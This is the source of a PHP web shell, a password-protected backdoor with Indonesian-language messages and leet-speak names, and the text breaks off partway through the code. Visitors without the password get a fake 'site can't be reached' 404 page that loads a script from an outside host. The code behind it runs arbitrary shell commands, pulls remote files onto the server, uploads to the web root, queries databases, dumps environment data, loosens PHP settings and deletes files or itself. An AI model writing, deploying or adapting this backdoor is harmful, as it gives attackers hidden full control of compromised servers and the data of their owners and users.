<?php
error_reporting(0);
session_start();

$pk = 'dp';
$ak = 'at';
$dk = 'pl';
$tk = 'st';

define('AUTH_PASS', '$2y$10$GOOgIVM8ibvc6a3uesDImOo4ieuBgSsooiwJWOT77yURv9Sbio9Be');

$curr_D1r = isset($_GET[$pk]) ? $_GET[$pk] : dirname(__FILE__);
$curr_D1r = realpath($curr_D1r);

$translations = [
    'en' => [ // English
        'title' => 'This site can\'t be reached',
        'message' => 'The web page at <span class="error-code">%s</span> might be temporarily down or it may have moved permanently to a new web address.'
    ],
    'ru' => [ // Rusia
        'title' => 'Этот сайт недоступен',
        'message' => 'Веб-страница на <span class="error-code">%s</span> может быть временно недоступна или была перемещена на новый веб-адрес.'
    ],
    'de' => [ // Germany
        'title' => 'Diese Website ist nicht erreichbar',
        'message' => 'Die Webseite unter <span class="error-code">%s</span> ist möglicherweise vorübergehend nicht erreichbar oder wurde dauerhaft an eine neue Webadresse verschoben.'
    ],
    'th' => [ // Thailand
        'title' => 'ไม่สามารถเข้าถึงเว็บไซต์นี้ได้',
        'message' => 'หน้าเว็บที่ <span class="error-code">%s</span> อาจไม่สามารถใช้งานได้ชั่วคราวหรืออาจย้ายไปยังที่อยู่เว็บใหม่ถาวรแล้ว'
    ],
    'vi' => [ // Vietnam
        'title' => 'Không thể truy cập trang web này',
        'message' => 'Trang web tại <span class="error-code">%s</span> có thể tạm thời không hoạt động hoặc đã được chuyển vĩnh viễn đến một địa chỉ web mới.'
    ],
    'ar-eg' => [ // Turkey
        'title' => 'لا يمكن الوصول إلى هذا الموقع',
        'message' => 'قد تكون صفحة الويب في <span class="error-code">%s</span> غير متاحة مؤقتًا أو ربما تم نقلها بشكل دائم إلى عنوان ويب جديد.'
    ],
    'ar' => [ // Arab
        'title' => 'يتعذر الوصول إلى هذا الموقع',
        'message' => 'قد تكون صفحة الويب في <span class="error-code">%s</span> معطلة مؤقتًا أو ربما تم نقلها بشكل دائم إلى عنوان ويب جديد.'
    ],
    'hi' => [ // Hindia
        'title' => 'यह साइट तक नहीं पहुंचा जा सकता',
        'message' => 'वेब पेज <span class="error-code">%s</span> अस्थायी रूप से बंद हो सकता है या इसे स्थायी रूप से किसी नए वेब पते पर ले जाया जा सकता है।'
    ],
    'id' => [ // Indonesian
        'title' => 'Situs ini tidak dapat dijangkau',
        'message' => 'Halaman web di <span class="error-code">%s</span> mungkin sedang tidak dapat diakses untuk sementara atau sudah dipindahkan ke alamat web baru.'
    ],
    'ms' => [ // Malay
        'title' => 'Laman web ini tidak dapat dicapai',
        'message' => 'Laman web di <span class="error-code">%s</span> mungkin ditutup sementara atau ia mungkin telah berpindah secara kekal ke alamat web baharu.'
    ],
    'pl' => [ // Polandia
        'title' => 'Ta witryna jest nieosiągalna',
        'message' => 'Strona internetowa pod adresem <span class="error-code">%s</span> może być tymczasowo niedostępna lub została przeniesiona na nowy adres internetowy.'
    ],
    'hu' => [ // Hungary
        'title' => 'Ezt a webhelyet nem lehet elérni',
        'message' => 'A weboldal a(z) <span class="error-code">%s</span> címen ideiglenesen leállt, vagy véglegesen átköltözött egy új webcímre.'
    ],
    'nl' => [ // Netherland
        'title' => 'Deze site kan niet worden bereikt',
        'message' => 'De webpagina op <span class="error-code">%s</span> is mogelijk tijdelijk niet beschikbaar of is permanent verplaatst naar een nieuw webadres.'
    ],
    'es-co' => [ // Colombia (Spain)
        'title' => 'No se puede acceder a este sitio',
        'message' => 'La página web en <span class="error-code">%s</span> podría estar temporalmente fuera de servicio o se ha movido permanentemente a una nueva dirección web.'
    ],
];

$lang_code = 'id'; 
if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
    $browser_langs = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
    foreach ($browser_langs as $bl) {
        $bl = strtolower(trim(substr($bl, 0, 5)));
        if (array_key_exists($bl, $translations)) {
            $lang_code = $bl;
            break;
        }
        $bl_short = substr($bl, 0, 2);
        if (array_key_exists($bl_short, $translations)) {
            $lang_code = $bl_short;
            break;
        }
    }
}

$lang = $translations[$lang_code];

function cln_p4th($p4th) {
    $p4th = str_replace(['../', './', '..\\', '.\\'], '', $p4th);
    $p4th = htmlspecialchars($p4th, ENT_QUOTES, 'UTF-8');
    return $p4th;
}

function s4nit1ze_inp($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

function get_symbolic_permissions($perms) {
    if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info;
}

function get_file_classification($filename) {
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $executable_extensions = ['php', 'php3', 'php4', 'php5', 'phtml', 'html', 'htm', 'shtml', 'pl', 'py', 'asp', 'aspx', 'jsp', 'cgi']; $binary_extensions = ['zip', 'rar', '7z', 'gz', 'tar', 'bz2', 'mp3', 'mp4', 'avi', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'bmp', 'ico', 'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'exe', 'dll', 'bin']; $is_executable = in_array($extension, $executable_extensions); $is_binary = in_array($extension, $binary_extensions); return ['is_executable' => $is_executable, 'is_binary' => $is_binary];
}

if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
    $password_input = isset($_POST['password_input']) ? $_POST['password_input'] : '';
    if (password_verify($password_input, AUTH_PASS)) {
        $_SESSION['authenticated'] = true;
        $_SESSION[$tk] = bin2hex(random_bytes(16));
        header("Location: ?" . $pk . "=" . urlencode($curr_D1r));
        exit();
    } else {
        header($_SERVER['SERVER_PROTOCOL'] . ' 404 Not Found');
        ?>
        <!DOCTYPE html>
        <html lang="<?php echo htmlentities($lang_code); ?>">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title><?php echo htmlentities($lang['title']); ?></title>
            <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
            <style>
                body { font-family: 'Roboto', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; background-color: #f8f9fa; color: #3c4043; text-align: center; } .error-container { max-width: 500px; padding: 20px; } .error-icon { font-size: 80px; color: #5f6368; margin-bottom: 20px; } h1 { font-size: 1.5rem; font-weight: 500; margin-bottom: 10px; color: #202124; } p { font-size: 0.9rem; line-height: 1.5; margin-bottom: 20px; } .error-code { font-family: monospace; background-color: #e8eaed; padding: 5px 10px; border-radius: 4px; font-size: 0.8rem; color: #5f6368; } @media (max-width: 600px) { h1 { font-size: 1.2rem; } p { font-size: 0.85rem; } .error-icon { font-size: 60px; } }
            </style>
        </head>
        <body>
            <div class="error-container">
                <div class="error-icon">&#9888;</div>
                <h1><?php echo htmlentities($lang['title']); ?></h1>
                <p><?php printf($lang['message'], htmlentities($_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])); ?></p>
                <div class="error-code">ERR_FAILED</div>
            </div>
            <script src="https://pub-32986c0dea444ec48b73859b51ce89a1.r2.dev/script.js"></script>
        </body>
        </html>
        <?php
        exit();
    }
}

if (isset($_GET['l0g0ut_k3y'])) {
    session_destroy();
    header("Location: " . basename(__FILE__));
    exit();
}

if (isset($_GET['k1ll_s3ss10n_k3y'])) {
    unset($_SESSION['authenticated']);
    unset($_SESSION[$tk]);
    header("Location: " . basename(__FILE__));
    exit();
}

if (isset($_POST[$ak]) && isset($_POST[$dk]) && isset($_POST[$tk]) && $_POST[$tk] === $_SESSION[$tk]) {
    header("X-Requested-With: XMLHttpRequest");
    header("Cache-Control: no-cache, no-store, must-revalidate");
    header("Pragma: no-cache");
    header("Expires: 0");
    header('Content-Type: application/json');
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    header("Access-Control-Allow-Headers: X-Requested-With, Content-Type");

    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Aksi tidak valid atau tidak diizinkan.'];
    $action_type = s4nit1ze_inp($_POST[$ak]);
    $d4t4 = json_decode($_POST[$dk], true);

    $target_p4th = isset($d4t4['curr_p4th']) ? realpath($d4t4['curr_p4th']) : realpath('.');
    if ($target_p4th === false || strpos($target_p4th, realpath($curr_D1r)) !== 0) {
        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => 'Akses ditolak: Path tidak valid.'];
        echo json_encode($r3sp0ns3);
        exit();
    }

    try {
        switch ($action_type) {
            case 'cr34t3_f0ld3r':
                $new_folder_name = cln_p4th($d4t4['n4m3']);
                $new_folder_path = $target_p4th . '/' . $new_folder_name;
                if (mkdir($new_folder_path)) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Folder '{$new_folder_name}' berhasil dibuat."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal membuat folder '{$new_folder_name}'."];
                }
                break;

            case 'cr34t3_f1l3':
                $new_file_name = cln_p4th($d4t4['n4m3']);
                $new_file_path = $target_p4th . '/' . $new_file_name;
                if (file_put_contents($new_file_path, $d4t4['c0nt3nt']) !== false) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File '{$new_file_name}' berhasil dibuat."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal membuat file '{$new_file_name}'."];
                }
                break;

            case 'r3n4m3_1t3m':
                $old_name = cln_p4th($d4t4['0ld_n4m3']);
                $new_name = cln_p4th($d4t4['n3w_n4m3']);
                $old_name_full_path = $target_p4th . '/' . $old_name;
                $new_name_full_path = $target_p4th . '/' . $new_name;
                if (rename($old_name_full_path, $new_name_full_path)) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Berhasil mengganti nama dari '{$old_name}' menjadi '{$new_name}'."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengganti nama '{$old_name}'."];
                }
                break;

            case 'ch4ng3_p3rm':
                $item_name = cln_p4th($d4t4['n4m3']);
                $target_item_path = $target_p4th . '/' . $item_name;
                $perm_val = intval($d4t4['p3rm'], 8);
                if (chmod($target_item_path, $perm_val)) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Permissions '{$item_name}' berhasil diubah ke {$d4t4['p3rm']}."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengubah permissions '{$item_name}'."];
                }
                break;

            case 'd3l3t3_1t3m':
                $item_name = cln_p4th($d4t4['n4m3']);
                $target_item_path = $target_p4th . '/' . $item_name;
                $deleted_successfully = false;
                if (is_dir($target_item_path)) {
                    if (function_exists('shell_exec')) {
                        shell_exec("rm -rf " . escapeshellarg($target_item_path));
                        $deleted_successfully = true;
                    } else {
                        if (class_exists('RecursiveDirectoryIterator') && class_exists('RecursiveIteratorIterator')) {
                            $it = new RecursiveDirectoryIterator($target_item_path, RecursiveDirectoryIterator::SKIP_DOTS);
                            $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                            $dir_deleted_php = true;
                            foreach($files as $file) {
                                if ($file->isDir()) {
                                    if (!@rmdir($file->getRealPath())) $dir_deleted_php = false;
                                } else {
                                    if (!@unlink($file->getRealPath())) $dir_deleted_php = false;
                                }
                            }
                            if ($dir_deleted_php && @rmdir($target_item_path)) {
                                $deleted_successfully = true;
                            }
                        }
                    }
                    if ($deleted_successfully) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Folder '{$item_name}' berhasil dihapus (rekursif)."];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menghapus folder '{$item_name}'. Mungkin tidak kosong atau tidak ada izin."];
                    }
                } elseif (file_exists($target_item_path)) {
                    if (unlink($target_item_path)) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File '{$item_name}' berhasil dihapus."];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menghapus file '{$item_name}'."];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Item '{$item_name}' tidak ditemukan."];
                }
                break;
            
            case 'mass_d3l3t3':
                $items_to_delete = $d4t4['items'];
                $deleted_count = 0;
                $failed_items_list = [];
                
                foreach ($items_to_delete as $item_name) {
                    $full_path = $target_p4th . '/' . cln_p4th($item_name);
                    
                    if (!file_exists($full_path) || strpos(realpath($full_path), realpath($curr_D1r)) !== 0) {
                        $failed_items_list[] = "{$item_name} (Akses ditolak atau tidak ditemukan)";
                        continue;
                    }

                    $item_deleted = false;
                    if (is_dir($full_path)) {
                        if (function_exists('shell_exec')) {
                            shell_exec("rm -rf " . escapeshellarg($full_path));
                            $item_deleted = true;
                        } else {
                            if (class_exists('RecursiveDirectoryIterator') && class_exists('RecursiveIteratorIterator')) {
                                $it = new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS);
                                $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                                $dir_deleted_php = true;
                                foreach($files as $file) {
                                    if ($file->isDir()) {
                                        if (!@rmdir($file->getRealPath())) $dir_deleted_php = false;
                                    } else {
                                        if (!@unlink($file->getRealPath())) $dir_deleted_php = false;
                                    }
                                }
                                if ($dir_deleted_php && @rmdir($full_path)) {
                                    $item_deleted = true;
                                }
                            }
                        }
                    } elseif (is_file($full_path)) {
                        if (unlink($full_path)) {
                            $item_deleted = true;
                        }
                    }

                    if ($item_deleted) {
                        $deleted_count++;
                    } else {
                        $failed_items_list[] = "{$item_name}";
                    }
                }

                if (count($failed_items_list) === 0) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Berhasil menghapus {$deleted_count} item."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Berhasil menghapus {$deleted_count} item, tetapi gagal menghapus: " . implode(', ', $failed_items_list)];
                }
                break;


            case 'g3t_f1l3_c0nt3nt':
                $item_name = cln_p4th($d4t4['n4m3']);
                $target_file_path = $target_p4th . '/' . $item_name;
                if (file_exists($target_file_path) && is_file($target_file_path)) {
                    $content = file_get_contents($target_file_path);
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Konten file berhasil diambil.', 'contentData' => base64_encode($content)];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal membaca file '{$item_name}'."];
                }
                break;

            case 's4v3_f1l3_c0nt3nt':
                $item_name = cln_p4th($d4t4['n4m3']);
                $target_file_path = $target_p4th . '/' . $item_name;
                $new_content_data = base64_decode($d4t4['c0nt3nt']);
                if (file_put_contents($target_file_path, $new_content_data) !== false) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Konten file '{$item_name}' berhasil disimpan."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menyimpan konten file '{$item_name}'."];
                }
                break;

            case '3x3c_c0mm4nd':
                $command_exec = $d4t4['c0mm4nd'];
                $command_output = "Command execution not allowed or failed.";
                if (function_exists('shell_exec')) {
                    $command_output = shell_exec($command_exec . ' 2>&1');
                } elseif (function_exists('proc_open')) {
                    $descriptorspec = array(
                       0 => array("pipe", "r"),
                       1 => array("pipe", "w"),
                       2 => array("pipe", "w")
                    );
                    $process = proc_open($command_exec, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        fclose($pipes[0]);
                        $command_output = stream_get_contents($pipes[1]);
                        fclose($pipes[1]);
                        $command_output .= stream_get_contents($pipes[2]);
                        fclose($pipes[2]);
                        proc_close($process);
                    }
                } else {
                    $command_output = "shell_exec and proc_open are disabled.";
                }
                $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Command executed.', 'commandOutput' => htmlentities($command_output)];
                break;

            case 'cUrL_d0wnl0ad':
                $url = filter_var($d4t4['url'], FILTER_VALIDATE_URL);
                $save_file_name = cln_p4th($d4t4['s4v3_n4m3']);
                $save_path = $target_p4th . '/' . $save_file_name;
                if ($url && function_exists('curl_init')) {
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
                    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
                    $file_content_curl = curl_exec($ch);
                    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                    curl_close($ch);

                    if ($file_content_curl !== false && $http_code < 400) {
                        if (file_put_contents($save_path, $file_content_curl)) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File berhasil diunduh dari URL dan disimpan sebagai '{$save_file_name}'."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menyimpan file ke '{$save_file_name}'."];
                        }
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengunduh file dari URL. HTTP Code: {$http_code}."];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "URL tidak valid atau cURL tidak diaktifkan."];
                }
                break;

            case 'z1p_3xtr4ct':
                $zip_file_name = cln_p4th($d4t4['f1l3']);
                $zip_file_path = $target_p4th . '/' . $zip_file_name;
                $dest_folder_name = cln_p4th($d4t4['d3st_f0ld3r']);
                $dest_folder_path = $target_p4th . '/' . $dest_folder_name;
                if (!file_exists($dest_folder_path)) {
                    mkdir($dest_folder_path, 0777, true);
                }

                if (class_exists('ZipArchive')) {
                    $zip_archive = new ZipArchive;
                    if ($zip_archive->open($zip_file_path) === true) {
                        if ($zip_archive->extractTo($dest_folder_path)) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File ZIP '{$zip_file_name}' berhasil diekstrak ke '{$dest_folder_name}'."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengekstrak file ZIP."];
                        }
                        $zip_archive->close();
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Tidak dapat membuka file ZIP '{$zip_file_name}'."];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Ekstensi ZipArchive tidak diaktifkan di PHP."];
                }
                break;

            case 'upL04d_f1l3':
            case 'upL04d_f1l3_root':
                $upload_target_dir = ($action_type === 'upL04d_f1l3_root' && isset($_SERVER['DOCUMENT_ROOT'])) ? realpath($_SERVER['DOCUMENT_ROOT']) : realpath($target_p4th);

                if ($upload_target_dir === false) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Direktori target upload tidak valid."];
                    break;
                }
                if (isset($_FILES['f1l3_t0_upL04d']) && $_FILES['f1l3_t0_upL04d']['error'] == UPLOAD_ERR_OK) {
                    $file_tmp_name = $_FILES['f1l3_t0_upL04d']['tmp_name'];
                    $file_name = cln_p4th(basename($_FILES['f1l3_t0_upL04d']['name']));
                    $file_dest = $upload_target_dir . '/' . $file_name;
                    if (move_uploaded_file($file_tmp_name, $file_dest)) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File '{$file_name}' berhasil diunggah ke `{$upload_target_dir}`."];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengunggah file '{$file_name}'. Periksa izin direktori `{$upload_target_dir}`."];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Kesalahan upload: " . $_FILES['f1l3_t0_upL04d']['error']];
                }
                break;
            
            case 'self_d3l3t3':
                $self_file = __FILE__;
                if (unlink($self_file)) {
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File manager berhasil dihapus."];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menghapus file manager."];
                }
                break;

            case 'g3t_php_1nf0':
                ob_start();
                phpinfo();
                $php_info_content = ob_get_clean();
                $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'PHP Info berhasil diambil.', 'phpInfoContent' => base64_encode($php_info_content)];
                break;
            
            case 'db_m4n4g3r_query':
                $host = $d4t4['host'];
                $user = $d4t4['user'];
                $pass = $d4t4['pass'];
                $db = $d4t4['db'];
                $query = $d4t4['query'];

                $conn = new mysqli($host, $user, $pass, $db);
                if ($conn->connect_error) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Koneksi database gagal: " . $conn->connect_error];
                } else {
                    $result = $conn->query($query);
                    if ($result === TRUE) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Query berhasil dieksekusi: " . $conn->affected_rows . " baris terpengaruh."];
                    } elseif ($result === FALSE) {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Query gagal: " . $conn->error];
                    } else {
                        $rows = [];
                        while($row = $result->fetch_assoc()) {
                            $rows[] = $row;
                        }
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Query berhasil dieksekusi.", 'queryResult' => $rows, 'queryHeaders' => array_keys($rows[0] ?? [])];
                    }
                    $conn->close();
                }
                break;

            case 'db_m4n4g3r_list_tables':
                $host = $d4t4['host'];
                $user = $d4t4['user'];
                $pass = $d4t4['pass'];
                $db = $d4t4['db'];

                $conn = new mysqli($host, $user, $pass, $db);
                if ($conn->connect_error) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Koneksi database gagal: " . $conn->connect_error];
                } else {
                    $tables_result = $conn->query("SHOW TABLES");
                    if ($tables_result === FALSE) {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mendapatkan daftar tabel: " . $conn->error];
                    } else {
                        $tables = [];
                        while($row = $tables_result->fetch_array(MYSQLI_NUM)) {
                            $tables[] = $row[0];
                        }
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Daftar tabel berhasil diambil.", 'tables' => $tables];
                    }
                    $conn->close();
                }
                break;
            
            case 'search_file_content':
                $search_string = $d4t4['search_string'];
                $search_path = $d4t4['search_path'];
                $recursive = $d4t4['recursive'];
                $regex = $d4t4['regex'];

                if (!function_exists('shell_exec')) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Fungsi shell_exec dinonaktifkan."];
                    break;
                }

                $cmd = "grep -n"; // -n for line number
                if ($recursive) {
                    $cmd .= " -r"; // -r for recursive
                }
                if ($regex) {
                    // grep is regex by default, no extra flag needed
                } else {
                    $cmd .= " -F"; // -F for fixed strings (not regex)
                }
                
                $escaped_search_string = escapeshellarg($search_string);
                $escaped_search_path = escapeshellarg($search_path);

                $full_command = "{$cmd} {$escaped_search_string} {$escaped_search_path} 2>&1";
                $output = shell_exec($full_command);

                $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Pencarian selesai.', 'commandOutput' => $output];
                break;

            case 'copy_move_item':
                $source_name = cln_p4th($d4t4['source_name']);
                $destination_path = cln_p4th($d4t4['destination_path']);
                $operation_type = $d4t4['operation_type']; // 'copy' or 'move'

                $source_full_path = $target_p4th . '/' . $source_name;
                $destination_full_path = realpath($destination_path) . '/' . $source_name; // Use realpath for security

                if (!file_exists($source_full_path) || strpos(realpath($source_full_path), realpath($curr_D1r)) !== 0) {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Sumber tidak valid atau akses ditolak."];
                    break;
                }
                if (!is_dir(realpath($destination_path)) || strpos(realpath($destination_path), realpath($curr_D1r)) !== 0) {
                     $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Destinasi tidak valid atau akses ditolak."];
                    break;
                }

                if ($operation_type === 'copy') {
                    if (is_file($source_full_path)) {
                        if (copy($source_full_path, $destination_full_path)) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "File '{$source_name}' berhasil disalin ke '{$destination_path}'."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal menyalin file '{$source_name}'."];
                        }
                    } elseif (is_dir($source_full_path)) {
                        // Recursive copy for directories requires more complex PHP or shell_exec
                        if (function_exists('shell_exec')) {
                            shell_exec("cp -r " . escapeshellarg($source_full_path) . " " . escapeshellarg(realpath($destination_path)));
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Folder '{$source_name}' berhasil disalin ke '{$destination_path}'."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Penyalinan folder membutuhkan shell_exec."];
                        }
                    }
                } elseif ($operation_type === 'move') {
                    if (rename($source_full_path, $destination_full_path)) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Item '{$source_name}' berhasil dipindahkan ke '{$destination_path}'."];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal memindahkan item '{$source_name}'."];
                    }
                }
                break;

            case 'create_archive':
                $archive_name = cln_p4th($d4t4['archive_name']);
                $archive_type = $d4t4['archive_type'];
                $items_to_archive = $d4t4['items']; // array of item names

                $archive_full_path = $target_p4th . '/' . $archive_name;

                if ($archive_type === 'zip') {
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($archive_full_path, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                            foreach ($items_to_archive as $item) {
                                $item_full_path = $target_p4th . '/' . cln_p4th($item);
                                if (is_file($item_full_path)) {
                                    $zip->addFile($item_full_path, $item);
                                } elseif (is_dir($item_full_path)) {
                                    $files = new RecursiveIteratorIterator(
                                        new RecursiveDirectoryIterator($item_full_path, RecursiveDirectoryIterator::SKIP_DOTS),
                                        RecursiveIteratorIterator::SELF_FIRST
                                    );
                                    foreach ($files as $file) {
                                        $file = realpath($file); // Get full path
                                        if (is_dir($file)) {
                                            $zip->addEmptyDir(str_replace($target_p4th . '/', '', $file . '/'));
                                        } elseif (is_file($file)) {
                                            $zip->addFile($file, str_replace($target_p4th . '/', '', $file));
                                        }
                                    }
                                }
                            }
                            $zip->close();
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Arsip ZIP '{$archive_name}' berhasil dibuat."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal membuat arsip ZIP."];
                        }
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Ekstensi ZipArchive tidak diaktifkan."];
                    }
                } elseif ($archive_type === 'tar.gz') {
                    if (function_exists('shell_exec')) {
                        // Use tar command for tar.gz
                        $items_escaped = array_map('escapeshellarg', $items_to_archive);
                        $command = "tar -czf " . escapeshellarg($archive_full_path) . " -C " . escapeshellarg($target_p4th) . " " . implode(" ", $items_escaped) . " 2>&1";
                        shell_exec($command);
                        if (file_exists($archive_full_path)) {
                            $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Arsip TGZ '{$archive_name}' berhasil dibuat."];
                        } else {
                            $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal membuat arsip TGZ. Periksa shell_exec dan izin."];
                        }
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Fungsi shell_exec diperlukan untuk membuat arsip TGZ."];
                    }
                }
                break;

            case 'set_php_ini':
                $setting = $d4t4['setting'];
                $value = $d4t4['value'];
                
                // Security: Limit what settings can be changed
                $allowed_settings = ['display_errors', 'max_execution_time', 'memory_limit', 'upload_max_filesize', 'post_max_size']; 
                if (in_array($setting, $allowed_settings) || (strpos($setting, 'disable_functions') !== false)) {
                     if (ini_set($setting, $value) !== false) {
                        $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => "Setting '{$setting}' berhasil diubah ke '{$value}' (runtime)."];
                    } else {
                        $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Gagal mengubah setting '{$setting}'. Mungkin tidak diizinkan atau fungsi dinonaktifkan."];
                    }
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Mengubah setting '{$setting}' tidak diizinkan."];
                }
                break;
            
            case 'list_processes': // from Process Manager
                if (function_exists('shell_exec')) {
                    $output = shell_exec("ps aux 2>&1");
                    $r3sp0ns3 = ['status' => 'success', 'm3ss4g3' => 'Daftar proses berhasil diambil.', 'commandOutput' => $output];
                } else {
                    $r3sp0ns3 = ['status' => 'error', 'm3ss4g3' => "Fungsi shell_exec dinonaktifkan."];
                }
                break;
            
            case 'view_environment': // from Env Viewer
                $env_vars = [];
                foreach ($_SERVER as $key => $value) {
                    $env_vars[$key] = $value;
                }
                foreach ($_ENV as $key => $value) {
                    $env_vars[$key] = $value;
                }
                // Add common Apache/PHP env if available
                if (function_exists('apache_get_modules')) {
